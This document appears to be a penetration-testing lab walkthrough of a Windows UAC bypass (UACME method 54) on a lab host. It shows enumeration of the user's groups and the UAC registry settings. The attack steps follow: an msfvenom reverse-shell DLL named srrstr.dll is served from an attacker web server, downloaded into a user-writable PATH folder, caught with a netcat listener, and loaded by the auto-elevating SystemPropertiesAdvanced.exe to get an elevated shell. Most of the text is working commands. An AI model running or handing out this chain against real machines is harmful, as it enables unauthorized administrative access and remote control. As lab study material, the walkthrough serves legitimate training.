# UAC

## Current User

```pwsh
PS C:\Users\sarah> whoami /user
```

```output title="Output"
USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

## Current User Privileges

```pwsh
PS C:\Users\sarah> whoami /priv
```

```output title="Output"
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

## Details About Administrators Group

```pwsh
PS C:\Users\sarah> net localgroup Administrators
```

```output title="Output" hl_lines="9"
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
The command completed successfully.
```

## UAC Configuration

```pwsh
PS C:\Users\sarah> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
```

```output title="Output"
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

## UAC [Level](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4)

| VALUE | MEANING |
|---|---|
| 0x00000000 | This option allows the Consent Admin to perform an operation that requires elevation without consent or credentials. |
| 0x00000001 | This option prompts the Consent Admin to enter his or her user name and password (or another valid admin) when an operation requires elevation of privilege. This operation occurs on the secure desktop. |
| 0x00000002 | This option prompts the administrator in Admin Approval Mode to select either "Permit" or "Deny" an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. "Prompt for consent" removes the inconvenience of requiring that users enter their name and password to perform a privileged task. This operation occurs on the secure desktop. |
| 0x00000003 | This option prompts the Consent Admin to enter his or her user name and password (or that of another valid admin) when an operation requires elevation of privilege. |
| 0x00000004 | This prompts the administrator in Admin Approval Mode to select either "Permit" or "Deny" an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. "Prompt for consent" removes the inconvenience of requiring that users enter their name and password to perform a privileged task. |
| 0x00000005 | This option is the default. It is used to prompt the administrator in Admin Approval Mode to select either "Permit" or "Deny" for an operation that requires elevation of privilege for any non-Windows binaries. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. This operation will happen on the secure desktop. |

```pwsh
PS C:\Users\sarah> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
```

```output title="Output"
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

## [UACME](https://github.com/hfiref0x/UACME) (Method 54)

### OS Version

```pwsh
PS C:\Users\sarah> [System.Environment]::OSVersion.Version
```

```output title="Output"
Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

### PATH

```pwsh
PS C:\Users\sarah> cmd /c echo "%PATH%"
```

```output title="Output" hl_lines="5"
C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

### Creating the Payload

!!! danger

    * [ ] windows/x64/shell_reverse_tcp
    * [x] windows/shell_reverse_tcp

```sh
my@attack:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.164 LPORT=9001 -f dll -o srrstr.dll
```

### Web Server

```sh
my@attack:~$ python3 -m http.server 8888
```

### Transferring

```pwsh
PS C:\Users\sarah> Invoke-WebRequest -Uri "http://10.10.14.164:8888/srrstr.dll" -OutFile "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

### Netcat

```sh
my@attack:~$ nc -lvnp 9001
```

### Reverse Shell

```pwsh
PS C:\Users\sarah> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

### Reverse Shell (Elevated)

#### Terminating [rundll32](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32)

```pwsh
PS C:\Users\sarah> foreach ($processPID in (Get-Process rundll32).Id) {taskkill /f /pid $processPID}
```

```output title="Output"
SUCCESS: The process with PID 2764 has been terminated.
SUCCESS: The process with PID 3204 has been terminated.
```

#### Triggering the Connection

```pwsh
PS C:\Users\sarah> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
